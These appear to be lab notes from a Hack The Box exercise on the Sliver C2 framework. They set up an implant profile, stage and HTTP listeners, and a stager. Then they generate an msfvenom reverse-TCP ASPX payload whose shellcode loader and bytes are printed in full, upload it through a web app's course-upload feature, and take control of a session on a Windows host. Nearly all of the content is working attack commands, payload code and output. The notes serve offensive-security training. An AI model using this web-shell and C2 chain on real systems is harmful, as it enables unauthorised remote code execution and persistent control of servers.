## Web Application

![](Probing%20the%20Surface-20261103-143915.png)

```sh
3kjS@htb[/htb]$ echo 'Sliver!' > test.aspx
3kjS@htb[/htb]$ ls
Desktop              sliver-server_linux      Templates
sliver-client_linux  test.aspx
```

![](Probing%20the%20Surface-20261103-144006.png)
## Sliver in Action

```sh
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb

[*] Saved new implant profile htb

sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb

[*] No builds found for profile htb, generating a new one
[*] Sliver name for profile htb: HIGH_RISER
[*] Job 2 (tcp) started

sliver > http -L 10.10.14.62 -l 8088

[*] Starting HTTP :8088 listener ...
[*] Successfully started job #3

sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt
```

```sh
3kjS@htb[/htb]$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2874 bytes
```

```aspx
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr 
param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] mO0UY = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
        0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
        0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x41,0x51,0x66,
        0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01
<SNIP>
IntPtr dY02WwpjPaDe = IntPtr.Zero;
        IntPtr et3XGeh06U = CreateThread(IntPtr.Zero,UIntPtr.Zero,fCLx5,IntPtr.Zero,0,ref dY02WwpjPaDe);
    }
</script>
```

If we replicate the steps regarding the usage of the upload course functionality, upon visiting the then uploaded `.aspx` file, we would see that a session has been established in `Sliver`.

```sh
sliver > sessions

 ID         Transport   Remote Address         Hostname   Username   Operating System   Health  
========== =========== ====================== ========== ========== ================== =========
 06ff8ed9   http(s)     10.129.205.234:49699   web01      <err>      windows/amd64      [ALIVE] 

[*] Session 42952b33 HIGH_RISER - 10.129.205.234:49702 (web01) - windows/amd64 - Mon, 02 Oct 2023 12:43:39 BST
```

Using the `use` command followed by the first few characters of the `ID` from the sessions of the session, we can utilize the session. Note that the `use` command supports TAB autocompletion.

```sh
sliver > use 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3

[*] Active session HIGH_RISER (06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3)

sliver (HIGH_RISER) > info

        Session ID: 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3
              Name: HIGH_RISER
          Hostname: web01
              UUID: 6c2c3942-c408-e0d4-245e-987849f4a588
          Username: <err>
               UID: <err>
               GID: <err>
               PID: 5876
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.62:8088
    Remote Address: 10.129.205.234:49699
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Mon Oct  2 12:43:18 BST 2023 (17m57s ago)
      Last Checkin: Mon Oct  2 13:01:13 BST 2023 (2s ago)
```
